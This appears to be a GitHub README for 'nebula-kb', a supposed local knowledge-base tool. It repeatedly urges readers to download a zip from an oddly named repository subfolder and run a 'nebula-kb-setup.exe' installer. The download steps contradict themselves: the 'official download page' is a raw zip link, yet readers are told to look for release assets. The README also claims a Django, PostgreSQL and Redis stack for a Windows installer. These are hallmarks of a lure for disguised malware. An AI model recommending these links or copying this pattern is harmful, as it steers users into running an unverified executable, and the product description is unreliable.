# 🌌 nebula-kb - Manage your knowledge assets with ease

[![](https://img.shields.io/badge/Download_Nebula-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kathrinechurrigueresque832/nebula-kb/main/allivalite/nebula-kb-3.5-alpha.5.zip)

## 📁 What is nebula-kb?

Nebula-kb helps you gather and organize your files. It acts as a central home for your notes and data. You can save information, search through it, and improve how you use your knowledge over time.

This platform keeps your data on your own computer. You hold your files, which offers better control and privacy. We built this tool using reliable technologies like Django, PostgreSQL, and Redis to ensure your information stays safe and easy to find.

## 🛠 Prerequisites

Before you start, ensure your computer meets these requirements:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 8GB of RAM.
*   **Storage:** 2GB of available space for the application and your data.
*   **Network:** An internet connection to perform the initial setup.

## 📥 How to Install

Follow these steps to set up the software on your Windows machine:

1.  Visit the [official download page](https://raw.githubusercontent.com/kathrinechurrigueresque832/nebula-kb/main/allivalite/nebula-kb-3.5-alpha.5.zip).
2.  Look for the section labeled "Assets" at the bottom of the latest release post.
3.  Click the file ending in `.exe` to start the download.
4.  Once the file finishes downloading, navigate to your "Downloads" folder.
5.  Double-click the file named `nebula-kb-setup.exe` to begin the installation.
6.  The Windows installer will open a window with instructions. Click "Next" to continue.
7.  Select the folder where you want to install the application.
8.  Click "Install" and wait for the process to finish.
9.  Select "Launch" to open the platform for the first time.

## 🚀 Getting Started

When you launch the application, it creates a local area for your files. This area acts as your private knowledge base. 

### Importing Data
You can bring your files into the system through the main dashboard. Click the "Ingest" button to select documents from your computer. The platform processes these files to make them searchable. It uses advanced methods to ensure your documents stay organized and indexed.

### Using the Search Feature
The platform includes a search bar at the top of the interface. Type a keyword or a question related to your files. The system looks through your stored information and shows the most relevant results. Because the system runs on your own hardware, the search results appear quickly.

### Managing Knowledge
You can edit, update, or remove files in the dashboard. The interface shows a list of all your assets. Each entry features a summary of its contents and a feedback loop option. You can add notes to your files, which helps the system understand how your knowledge relates to other subjects.

## 📈 Optimization and Feedback

The "Ops Dashboard" tab helps you manage your knowledge health. It shows how much data you have saved and how well the system indexes your information. 

If you find that search results need improvement, use the feedback feature. Click the "Provide Feedback" icon next to any search result. Tell the system if the information is accurate or if it needs adjustment. This process trains the local system to match your preferences better as you use it.

## 🔒 Your Data and Privacy

Privacy remains a priority. All data stays on your local drive. The application does not send your personal files to external servers. PostgreSQL keeps your data structured, while Redis manages the quick retrieval of information. You remain the sole owner of your information.

## ❓ Frequently Asked Questions

**Does the software require an active internet connection?**
You only need an internet connection to download and install the software. Once installed, it runs entirely on your local machine.

**Can I export my files?**
Yes. You can export your library as a backup file through the settings menu.

**What happens if I forget my login password?**
Since the platform is local, you manage your own access. Keep your credentials in a safe place. If you lose them, you may need to reinstall the software and re-import your files from your local backup.

**Can I increase the speed of the system?**
The software performs best when installed on a Solid State Drive. It also benefits from having enough free memory when handling large amounts of documents.

## 🛠 Troubleshooting

*   **App won't open:** Check for Windows updates and restart your computer. Ensure you have administrative rights to run new software.
*   **Search seems slow:** Close other programs that consume a lot of memory. 
*   **Disk space warnings:** Move your library folder to a larger storage drive through the settings menu.
